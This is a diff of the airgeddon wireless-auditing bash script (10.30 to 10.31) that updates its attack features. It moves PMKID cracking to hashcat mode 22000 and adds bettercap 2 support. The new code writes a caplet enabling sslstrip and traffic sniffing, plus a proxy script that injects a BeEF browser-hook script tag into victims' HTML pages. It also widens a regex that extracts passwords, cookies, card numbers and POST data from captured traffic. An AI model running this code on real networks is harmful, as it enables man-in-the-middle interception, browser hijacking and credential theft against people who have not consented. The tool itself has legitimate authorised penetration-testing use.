@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Version......: 10.30
+#Version......: 10.31
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -70,7 +70,7 @@ optional_tools_names=(
 						"asleap"
 						"john"
 						"openssl"
-						"hcxpcaptool"
+						"hcxpcapngtool"
 						"hcxdumptool"
 						"tshark"
 					)
@@ -121,7 +121,7 @@ declare -A possible_package_names=(
 									[${optional_tools_names[21]}]="asleap" #asleap
 									[${optional_tools_names[22]}]="john" #john
 									[${optional_tools_names[23]}]="openssl" #openssl
-									[${optional_tools_names[24]}]="hcxtools" #hcxpcaptool
+									[${optional_tools_names[24]}]="hcxtools" #hcxpcapngtool
 									[${optional_tools_names[25]}]="hcxdumptool" #hcxdumptool
 									[${optional_tools_names[26]}]="tshark / wireshark-cli / wireshark" #tshark
 									[${update_tools[0]}]="curl" #curl
@@ -133,8 +133,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="10.30"
-language_strings_expected_version="10.30-1"
+airgeddon_version="10.31"
+language_strings_expected_version="10.31-1"
 standardhandshake_filename="handshake-01.cap"
 standardpmkid_filename="pmkid_hash.txt"
 standardpmkidcap_filename="pmkid.cap"
@@ -173,7 +173,7 @@ aircrack_pmkid_version="1.4"
 hashcat3_version="3.0"
 hashcat4_version="4.0.0"
 hashcat_hccapx_version="3.40"
-minimum_hashcat_pmkid_version="4.2.0"
+minimum_hashcat_pmkid_version="6.0.0"
 hashcat_tmp_simple_name_file="hctmp"
 hashcat_tmp_file="${hashcat_tmp_simple_name_file}.hccap"
 hashcat_pot_tmp="${hashcat_tmp_simple_name_file}.pot"
@@ -260,10 +260,13 @@ bettercap_proxy_port="8080"
 bettercap_dns_port="5300"
 minimum_bettercap_advanced_options="1.5.9"
 minimum_bettercap_fixed_beef_iptables_issue="1.6.2"
-maximum_bettercap_supported_version="1.6.2"
+bettercap2_version="2.0"
+bettercap2_sslstrip_working_version="2.28"
 sslstrip_file="ag.sslstrip.log"
 ettercap_file="ag.ettercap.log"
 bettercap_file="ag.bettercap.log"
+bettercap_config_file="ag.bettercap.cap"
+bettercap_hook_file="ag.bettercap.js"
 beef_port="3000"
 beef_control_panel_url="http://${loopback_ip}:${beef_port}/ui/panel"
 jshookfile="hook.js"
@@ -5433,6 +5436,8 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
 	rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
 	if [ "${beef_found}" -eq 1 ]; then
 		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
@@ -6029,7 +6034,7 @@ function beef_pre_menu() {
 				if check_interface_wifi "${interface}"; then
 					et_mode="et_sniffing_sslstrip2"
 					get_bettercap_version
-					if compare_floats_greater_than "${bettercap_version}" "${maximum_bettercap_supported_version}"; then
+					if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}" && ! compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_sslstrip_working_version}"; then
 						echo
 						language_strings "${language}" 174 "red"
 						language_strings "${language}" 115 "read"
@@ -7099,6 +7104,12 @@ function check_bssid_in_captured_file() {
 		return 0
 	else
 		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "only_handshake" ]]; then
+			echo
+			language_strings "${language}" 323 "red"
+			language_strings "${language}" 115 "read"
+		fi
+		if [[ "${2}" = "showing_msgs_checking" ]] && [[ "${3}" = "also_pmkid" ]]; then
+			echo
 			language_strings "${language}" 323 "red"
 			language_strings "${language}" 115 "read"
 		fi
@@ -7229,7 +7240,7 @@ function validate_pmkid_hashcat_file() {
 	readarray -t HASHCAT_LINES_TO_VALIDATE < <(cat "${1}" 2> /dev/null)
 
 	for item in "${HASHCAT_LINES_TO_VALIDATE[@]}"; do
-		if [[ ! "${item}" =~ ^[a-zA-Z0-9]{32}\*[a-zA-Z0-9]{12}\*.*$ ]]; then
+		if [[ ! "${item}" =~ ^WPA\*[0-9]{2}\*[0-9a-fA-F]{32}\*([0-9a-fA-F]{12}\*){2}[0-9a-fA-F]{26,28}\*{3}$ ]]; then
 			language_strings "${language}" 676 "red"
 			language_strings "${language}" 115 "read"
 			return 1
@@ -8475,7 +8486,7 @@ function exec_hashcat_dictionary_attack() {
 	elif [ "${1}" = "personal_pmkid" ]; then
 		tmpfiles_toclean=1
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
-		hashcat_cmd="hashcat -m 16800 -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+		hashcat_cmd="hashcat -m 22000 -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
 	else
 		tmpfiles_toclean=1
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
@@ -8495,7 +8506,7 @@ function exec_hashcat_bruteforce_attack() {
 	elif [ "${1}" = "personal_pmkid" ]; then
 		tmpfiles_toclean=1
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
-		hashcat_cmd="hashcat -m 16800 -a 3 \"${hashcatpmkidenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+		hashcat_cmd="hashcat -m 22000 -a 3 \"${hashcatpmkidenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
 	else
 		tmpfiles_toclean=1
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
@@ -8515,7 +8526,7 @@ function exec_hashcat_rulebased_attack() {
 	elif [ "${1}" = "personal_pmkid" ]; then
 		tmpfiles_toclean=1
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
-		hashcat_cmd="hashcat -m 16800 -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
+		hashcat_cmd="hashcat -m 22000 -a 0 \"${hashcatpmkidenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
 	else
 		tmpfiles_toclean=1
 		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
@@ -8843,6 +8854,52 @@ function exec_et_captive_portal_attack() {
 	fi
 	restore_et_interface
 	clean_tmpfiles
+}
+
+#Create configuration files for bettercap
+function set_bettercap_config() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
+
+	{
+	echo -e "set http.proxy.port ${bettercap_proxy_port}"
+	echo -e "set http.proxy.script ${bettercap_hook_file}"
+	echo -e "set http.proxy.sslstrip true"
+	echo -e "http.proxy on\n"
+	echo -e "set net.sniff.verbose true"
+	echo -e "net.recon on"
+	echo -e "net.sniff on\n"
+	echo -e "events.stream off"
+	echo -e "set events.stream.http.request.dump true\n"
+	echo -e "events.ignore net.sniff.http.response"
+	echo -e "events.ignore http.proxy.spoofed-response"
+	echo -e "events.ignore net.sniff.dns"
+	echo -e "events.ignore net.sniff.tcp"
+	echo -e "events.ignore net.sniff.udp"
+	echo -e "events.ignore net.sniff.mdns"
+	echo -e "events.ignore net.sniff.sni"
+	echo -e "events.ignore net.sniff.https\n"
+	echo -e "events.stream on"
+	} >> ${tmpdir}${bettercap_config_file}
+
+	{
+	echo -e "function onLoad() {"
+	echo -e "\tlog('BeefInject loaded.');"
+	echo -e "\tlog('targets: ' + env['arp.spoof.targets']);"
+	echo -e "}\n"
+	echo -e "function onResponse(req, res) {"
+	echo -e "\tif (res.ContentType.indexOf('text/html') == 0) {"
+	echo -e "\t\tvar body = res.ReadBody();"
+	echo -e "\t\tif (body.indexOf('</head>') != -1) {"
+	echo -e "\t\t\tres.Body = body.replace('</head>', '<script type=\"text/javascript\" src=\"http://${et_ip_router}:${beef_port}/${jshookfile}\"></script></head>');"
+	echo -e "\t\t}"
+	echo -e "\t}"
+	echo -e "}"
+	} >> ${tmpdir}${bettercap_hook_file}
 }
 
 #Create configuration file for hostapd
@@ -10405,6 +10462,11 @@ function set_captive_portal_page() {
 	echo -e "#showpass {"
 	echo -e "\tvertical-align: top;"
 	echo -e "}\n"
+	echo -e "@media screen (min-width: 1000px) {"
+	echo -e "\t.content {"
+	echo -e "\t\twidth: 50%;"
+	echo -e "\t}"
+	echo -e "}\n"
 	} >> "${tmpdir}${webdir}${cssfile}"
 
 	{
@@ -10441,6 +10503,7 @@ function set_captive_portal_page() {
 	echo -e "echo '<!DOCTYPE html>'"
 	echo -e "echo '<html>'"
 	echo -e "echo -e '\t<head>'"
+	echo -e "echo -e '\t\t<meta name=\"viewport\" content=\"width=device-width\"/>'"
 	echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
 	echo -e "echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'"
 	echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
@@ -10952,14 +11015,25 @@ function launch_bettercap_sniffing() {
 	recalculate_windows_sizes
 	sniffing_scr_window_position=${g4_bottomright_window}
 
-	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
-		bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
-	fi
+	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
 
-	bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+		set_bettercap_config
 
-	if [ ${bettercap_log} -eq 1 ]; then
-		bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
+		bettercap_cmd="bettercap -iface ${interface} -no-history -caplet ${tmpdir}${bettercap_config_file}"
+
+		if [ ${bettercap_log} -eq 1 ]; then
+			bettercap_cmd+=" | tee ${tmp_bettercaplog}"
+		fi
+	else
+		if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
+			bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
+		fi
+
+		bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+
+		if [ ${bettercap_log} -eq 1 ]; then
+			bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
+		fi
 	fi
 
 	manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${sniffing_scr_window_position} -T \"Sniffer+Bettercap-Sslstrip2/BeEF\"" "${bettercap_cmd}" "Sniffer+Bettercap-Sslstrip2/BeEF"
@@ -11022,7 +11096,15 @@ function parse_bettercap_log() {
 	echo
 	language_strings "${language}" 304 "blue"
 
-	local regexp='USER|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE'
+	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
+		sed -Ei 's/\x1b\[[0-9;]*m.+\x1b\[[0-9;]K//g' "${tmp_bettercaplog}"
+		sed -Ei 's/\x1b\[[0-9;]*m|\x1b\[J|\x1b\[[0-9;]K|\x8|\xd//g' "${tmp_bettercaplog}"
+		sed -Ei 's/.*»//g' "${tmp_bettercaplog}"
+		sed -Ei 's/^[[:blank:]]*//g' "${tmp_bettercaplog}"
+		sed -Ei '/^$/d' "${tmp_bettercaplog}"
+	fi
+
+	local regexp='USER|UNAME|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE|CORREO|MAIL|NET.SNIFF.HTTP.REQUEST.*POST|HTTP\].*POST'
 	local regexp2='USER-AGENT|COOKIES|BEEFHOOK'
 	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | grep -E -i ${regexp} | grep -E -vi ${regexp2})
 
@@ -11042,7 +11124,7 @@ function parse_bettercap_log() {
 	pass_counter=0
 	captured_cookies=()
 	for cpass in "${BETTERCAPLOG[@]}"; do
-		if [[ ${cpass} =~ COOKIE ]]; then
+		if [[ ${cpass^^} =~ ${regexp^^} ]]; then
 			repeated_cookie=0
 			for item in "${captured_cookies[@]}"; do
 				if [ "${item}" = "${cpass}" ]; then
@@ -12087,7 +12169,7 @@ function launch_pmkid_capture() {
 	manage_output "+j -sb -rightbar -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"Capturing PMKID\"" "timeout -s SIGTERM ${timeout_capture_pmkid} hcxdumptool -i ${interface} --enable_status=1 ${hcxdumptool_filter}${tmpdir}target.txt --filtermode=2 -o ${tmpdir}pmkid.pcapng" "Capturing PMKID" "active"
 	wait_for_process "timeout -s SIGTERM ${timeout_capture_pmkid} hcxdumptool -i ${interface} --enable_status=1 ${hcxdumptool_filter}${tmpdir}target.txt --filtermode=2 -o ${tmpdir}pmkid.pcapng" "Capturing PMKID"
 
-	if hcxpcaptool -z "${tmpdir}${standardpmkid_filename}" "${tmpdir}pmkid.pcapng" | grep -q "PMKID(s) written" 2> /dev/null; then
+	if hcxpcapngtool -o "${tmpdir}${standardpmkid_filename}" "${tmpdir}pmkid.pcapng" | grep -Eq "PMKID(\(s\))? written" 2> /dev/null; then
 		pmkidpath="${default_save_path}"
 		pmkidfilename="pmkid-${bssid}.txt"
 		pmkidpath="${pmkidpath}${pmkidfilename}"
@@ -12731,8 +12813,8 @@ function et_prerequisites() {
 		msg_mode="showing_msgs_checking"
 
 		if [[ ${yesno} = "n" ]] || [[ ${retrying_handshake_capture} -eq 1 ]]; then
-			capture_handshake_evil_twin
 			msg_mode="silent"
+			capture_handshake_evil_twin
 			case "$?" in
 				"2")
 					retry_handshake_capture=1
@@ -12768,6 +12850,7 @@ function et_prerequisites() {
 				return_to_enterprise_main_menu=1
 			else
 				return_to_et_main_menu=1
+				return_to_et_main_menu_from_beef=1
 			fi
 			return
 		fi
@@ -15078,7 +15161,7 @@ function parse_plugins() {
 
 					#shellcheck source=./plugins/missing_dependencies.sh
 					source "${file}"
-					if [ ${plugin_enabled} -eq 1 ]; then
+					if [ "${plugin_enabled}" -eq 1 ]; then
 						validate_plugin_requirements
 						plugin_validation_result=$?
 						if [ "${plugin_validation_result}" -eq 0 ]; then
